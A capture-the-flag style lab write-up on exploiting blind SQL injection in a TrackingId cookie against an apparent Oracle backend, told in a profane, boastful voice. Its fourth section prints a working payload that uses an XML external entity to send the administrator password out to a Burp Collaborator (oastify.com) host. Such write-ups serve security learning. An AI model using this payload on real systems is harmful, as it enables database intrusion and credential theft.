## 🎯 Objective

Exploit a **blind SQL injection vulnerability** where:

- No SQL errors are displayed
- No boolean response differences exist
- No time delays are observable

and **exfiltrate sensitive data (administrator password)** using **out‑of‑band (OAST) interaction via DNS/HTTP requests**.

This lab goes one step further than confirmation — it proves **data theft** through the database itself. Nasty, elegant, and effective

---

## 🧩 1. Initial Testing & Dead Ends

### Parameters Tested

- URL parameters
- POST body parameters
- Cookie parameter: `TrackingId`

### Initial Payloads

- Single quote (`'`)
- Boolean-based conditions
- Time-delay payloads

### Observation

- No errors
- No response differences
- No delays

At this point, the application was completely silent.

---

### 🔴 Critical Insight (Why This Matters)

Silence does NOT mean safety. It means the app is hardened — not invulnerable.

If you stop here, you’re a lazy fuck. Real attackers don’t need the app to talk back — they make the **database scream over the network**.

---

## 🧠 2. Escalation Mindset: OAST or Die

Since:

- Error-based ❌
- Boolean-based ❌
- Time-based ❌

The only remaining feedback channel is **out‑of‑band interaction**.

Key idea:

> If SQL is executed, the database can be forced to make an external request containing stolen data.
> 

At this point:

- Burp Collaborator (OASTify) becomes the oracle
- The browser response becomes irrelevant

---

## 🔍 3. Database Assumption

Based on:

- Lab pattern
- Support for `dual`
- XML external entity behavior

The backend database was assumed to be **Oracle**.

Oracle is perfect for OAST exfiltration because:

- It supports XML parsing inside SQL
- It allows external entity resolution
- It can concatenate query results into URLs

---

## 💣 4. Data Exfiltration Payload (Oracle)

The following payload was injected into the **`TrackingId` cookie parameter** (URL‑encoded in the actual request):

```sql
'|| (
  SELECT EXTRACTVALUE(
    xmltype(
      '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY% remoteSYSTEM "http://' ||
           (SELECT password FROM users WHERE username='administrator')
         || '.il7kbx1iun37kkj9i5wrko80yr4isagz.oastify.com/">
%remote;
       ]>'
    ),
    '/l'
  )
  FROM dual
) --

```

---

## 🧠 Why This Payload Is Fucking Brutal

- The subquery extracts the **administrator password**
- The password is concatenated into a URL
- Oracle resolves the external entity
- The database sends the password **out‑of‑band**
- Nothing needs to appear in the HTTP response

This isn’t guessing. This isn’t brute force.

This is **direct data exfiltration through DNS/HTTP**.

---

## 📡 5. Out‑of‑Band Confirmation & Data Theft

### Result in Burp Collaborator

- An inbound DNS/HTTP interaction was received
- The subdomain contained the **administrator password**
- Interaction originated from the target server

At this point:

- SQL injection is confirmed
- Data extraction is confirmed
- Administrator credentials are compromised

Absolute checkmate.

---

## 🏁 6. Final Result

```
Username: administrator
Password: <exfiltrated via OAST>
```

- Logged in successfully
- Application confirmed administrator access
- Lab marked as **Solved**
<img width="1225" height="247" alt="image" src="https://github.com/user-attachments/assets/872c3762-a267-495b-b42a-f93178b33a23" />

---

## 🧭 7. Key Takeaways (Tattoo This in Your Brain)

- No output ≠ no vulnerability
- Blind SQLi does NOT end at time delays
- OAST is the final escalation path
- Oracle XML external entities are lethal
- Databases don’t need to talk to the app — they can talk to **you**

If you don’t test out‑of‑band data exfiltration, you’re missing real‑world SQL injection.

---

## 📝 Notes for My Future Self

- Always test cookies
- Always assume the app will lie to you
- Always think: *How can the database leak data without the app?*
- Burp Collaborator is not optional — it’s mandatory
